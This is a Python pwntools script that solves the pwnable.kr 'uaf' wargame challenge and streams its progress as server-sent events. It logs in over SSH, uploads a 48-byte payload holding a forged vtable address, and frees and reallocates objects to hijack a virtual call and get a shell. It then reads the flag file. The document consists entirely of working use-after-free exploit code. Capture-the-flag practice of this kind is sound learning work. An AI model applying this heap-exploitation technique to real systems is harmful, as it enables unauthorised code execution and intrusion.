from pwn import *
import json
import time

def exploit_uaf(challenge_config):
    """uaf exploit implementation"""
    def log(msg):
        yield f"data: {json.dumps({'type': 'log', 'message': msg})}\n\n"
    
    try:
        yield from log("Connecting to pwnable.kr...")
        
        context.log_level = 'error'
        s = ssh(host=challenge_config['ssh_host'], 
                port=challenge_config['ssh_port'], 
                user=challenge_config['ssh_user'], 
                password=challenge_config['ssh_pass'])
        yield from log("✓ Connected successfully")
        
        yield from log("Building exploit payload...")
        
        vtable_addr = p64(0x404d78)
        payload = vtable_addr + (b'A' * (48 - len(vtable_addr)))
        
        yield f"data: {json.dumps({'type': 'payload', 'payload': repr(payload)})}\n\n"
        yield from log("✓ Payload constructed (48 bytes)")
        
        yield from log("Creating exploit file...")
        tmpdir = '/tmp/yael_uaf_' + str(os.getpid())
        s.run(f'mkdir -p {tmpdir}')
        
        payload_file = tmpdir + '/input'
        with s.sftp.open(payload_file, 'wb') as f:
            f.write(payload)
        
        yield from log("✓ Exploit file created")
        
        yield from log("Launching UAF exploit...")
        p = s.process(['/home/uaf/uaf', '48', payload_file])
        
        yield from log("Waiting for menu...")
        p.recvuntil(b'3. free')
        
        yield from log("Step 1: Freeing objects...")
        p.sendline(b'3')
        p.recvuntil(b'3. free')
        
        yield from log("Step 2: First allocation...")
        p.sendline(b'2')
        p.recvuntil(b'your data is allocated')
        p.recvuntil(b'3. free')
        
        yield from log("Step 3: Second allocation (overwriting freed object)...")
        p.sendline(b'2')
        p.recvuntil(b'your data is allocated')
        p.recvuntil(b'3. free')
        
        yield from log("Step 4: Triggering virtual call with hijacked vtable...")
        p.sendline(b'1')
        
        time.sleep(0.5)
        p.recv(timeout=1)
        
        yield from log("Shell spawned! Reading flag...")
        p.sendline(b'cat /home/uaf/flag')
        
        all_output = b''
        for i in range(5):
            try:
                chunk = p.recv(timeout=0.5)
                all_output += chunk
                # Break early if we see the flag
                if b'd3lici0us' in all_output:
                    break
            except:
                break
        
        # Don't wait for exit, just kill the process
        try:
            p.kill()
        except:
            pass
        
        output_str = all_output.decode(errors='ignore')
        
        flag_found = False
        for line in output_str.split('\n'):
            line = line.strip()
            if 'd3lici0us' in line or ('_' in line and len(line) > 20 and 'fl4g' in line):
                yield from log("✓ Flag captured!")
                yield f"data: {json.dumps({'type': 'flag', 'flag': line})}\n\n"
                flag_found = True
                break
        
        if not flag_found:
            yield from log("⚠ Flag not found in output")
        
        s.close()
        
        yield from log("✓ Exploit complete")
        yield f"data: {json.dumps({'type': 'done'})}\n\n"
        
    except Exception as e:
        import traceback
        yield from log(f"✗ Error: {str(e)}")
        yield f"data: {json.dumps({'type': 'error', 'message': str(e)})}\n\n"